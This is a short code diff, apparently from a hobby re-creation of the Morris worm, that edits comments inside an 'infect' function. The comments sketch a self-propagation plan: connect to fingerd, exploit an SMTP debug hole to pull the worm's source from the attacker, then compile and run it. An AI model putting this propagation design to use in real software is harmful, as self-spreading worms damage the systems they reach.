@@ -209,7 +209,7 @@ void infect(char *ip, char *my_ip) {
     */
 
     /* 
-    Crazy 12:37am idea: Use SMTP debug vulnerablity to pull the files over instead...
+    12:37am idea: Use SMTP debug vulnerablity to pull the files over instead...
 
     Something like this:
         - connect socket to fingerd server
@@ -218,7 +218,7 @@ void infect(char *ip, char *my_ip) {
             worm.c and worm.h (and whatever else)
         - compile and run worm.c, in theory completing self propogation
 
-    Would this work? Is this faithful to morris worm? Idk. Needs more thought
+    Is this faithful to morris worm? Probably not? Idk. Needs more thought
     */
 
     // Compile and run receive_file, should pull in worm.c and worm.h from attacker
